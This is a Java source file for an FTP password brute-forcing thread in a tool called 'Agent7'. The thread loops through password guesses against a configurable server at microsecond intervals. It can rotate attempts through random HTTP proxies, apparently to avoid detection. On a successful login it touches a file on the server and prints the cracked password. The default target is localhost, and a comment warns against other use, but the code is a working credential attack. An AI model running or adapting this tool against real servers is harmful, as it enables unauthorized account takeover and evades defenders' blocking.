package me.dylan.Agent7.Threads;

import java.io.IOException;
import java.net.ConnectException;
import java.net.SocketException;
import me.dylan.Agent7.Agent7;

import org.apache.commons.net.ftp.FTPClient;
import org.apache.commons.net.ftp.FTPHTTPClient;
import org.apache.commons.net.ftp.FTPReply;

public class ThreadBruteforceFTP extends ThreadBruteforce {

	FTPClient client;
	String username;
	int port;
	int offset = 0;
	/**
	 * This is the ip of the destination server. This is ONLY to be changed from
	 * localhost for testing purposes, anything else, and it's being used with
	 * malicious intent. If you are seeing this, you probably shouldn't be.
	 */
	public static String ip = "localhost";

	public ThreadBruteforceFTP(int port, String username) throws IOException {
		/*
		 * 
		 * insanely long passwords, so we can verify in a way other than length.
		 */
		super(10000);
		this.username = username;
		this.port = port;
		setDelayMicroS(1);
	}

	public void run() {
		if (Agent7.fireDrillEnabled) {
			String proxy = Agent7.instance.proxySelector.getRandomProxy();
			Agent7.logLine("Connecting with proxy: " + proxy);
			client = new FTPHTTPClient(proxy.split(":")[0],
					Integer.parseInt(proxy.split(":")[1]));
		} else {
			client = new FTPClient();
		}
		try {
			client.connect(ip, port);
			Agent7.logLine("Connected succesfully!");
		} catch (SocketException e3) {
			// Agent7.err(e3);
			// Agent7.logLine("Could not connect...");
		} catch (IOException e3) {
			// removeProxy(proxy);
			// Agent7.err(e3);
		}
		while (!this.isFinished && !this.isInterrupted()) {
			String proxy = "";
			if (!client.isConnected()) {
				try {

					if (Agent7.fireDrillEnabled) {
						proxy = Agent7.instance.proxySelector.getRandomProxy();
						Agent7.logLine("Connecting with proxy: " + proxy);
						client = new FTPHTTPClient(proxy.split(":")[0],
								Integer.parseInt(proxy.split(":")[1]));
					} else {
						client = new FTPClient();
					}

					// client.setConnectTimeout(3000);
					client.connect(ip, port);
					Agent7.logLine("Connected succesfully!");
				} catch (ConnectException e) {
					Agent7.err(e);
				} catch (IOException e2) {
					Agent7.err(e2);
					/*
					 * removeProxy(proxy);
					 */if (client.isConnected()) {
						try {
							client.disconnect();
							if (Agent7.fireDrillEnabled)
								Agent7.instance.proxySelector
										.finishedWithProxy(proxy);
						} catch (IOException e) {
							Agent7.err(e);
						}
						continue;
					}
					continue;
				}

			}
			if (!client.isConnected())
				continue;
			// String info = client.getReplyString();
			// if (info != null)
			// System.out.println(info);
			int reply = client.getReplyCode();
			/*
			 * if (reply != 0) { if (!FTPReply.isPositiveCompletion(reply) &&
			 * !FTPReply.isPositiveIntermediate(reply) &&
			 * !FTPReply.isPositivePreliminary(reply)) { try { reconnect(); }
			 * catch (IOException e) { e.printStackTrace(); } continue; } else {
			 * Agent7.logLine("Connection succesful!"); } }
			 */
			// Agent7.logLine("Server response data: " +
			// client.getReplyString());
			try {
				String pass = ThreadSyncFTP.getNextPass(this);
				if (pass.isEmpty()) {
					pass = ThreadSyncFTP.getNextPass(this);
				}
				boolean hasLoggedin = client.login(username, pass);
				this.setVerified(hasLoggedin);
				if (this.getVerified() && FTPReply.isPositiveCompletion(reply)) {
					client.enterLocalPassiveMode();
					client.appendFileStream("Proxies.dat");
					client.disconnect();
					Agent7.logLine("Password found!!! Password: "
							+ currentPasswordTesting);
					System.out.println("Password found!!! Password: "
							+ currentPasswordTesting);
					System.exit(0);
				} else {
					// client.logout();
					if (client.isConnected())
						currentPasswordTesting = ThreadSyncFTP
								.getNextPass(this);
					else
						reconnect();

				}

			} catch (IOException e1) {
				Agent7.logLine("Disconnected by server, attempting reconnect.");
				try {
					reconnect();
				} catch (IOException e) {
					try {
						reconnect();
					} catch (IOException e2) {
						Agent7.err(e2);
					}
					if (Agent7.fireDrillEnabled)
						Agent7.instance.proxySelector.finishedWithProxy(proxy);
					// Agent7.instance.proxySelector.remove(proxy);
					// Agent7.logLine("Removed dead proxy: "+proxy);
					// e.printStackTrace();
				}
			}
			try {
				Thread.sleep(getDelayMiliS(), getDelayMicroS());
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
		}
	}

	public void removeProxy(String proxy) {
		Agent7.instance.proxySelector.remove(proxy);
		Agent7.logLine("Removed dead proxy: " + proxy);
	}

	public void reconnect() throws SocketException, IOException {

		if (Agent7.fireDrillEnabled) {
			String proxy = Agent7.instance.proxySelector.getRandomProxy();
			Agent7.logLine("Connecting with proxy: " + proxy);
			client = new FTPHTTPClient(proxy.split(":")[0],
					Integer.parseInt(proxy.split(":")[1]));
		} else {
			client = new FTPClient();
		}
		client.setConnectTimeout(4000);
		client.setDataTimeout(4000);
		client.connect(ip, port);
	}

	@Override
	public String constructCurrentString() {
		return ThreadSyncFTP.constructCurrentString();
	}
}
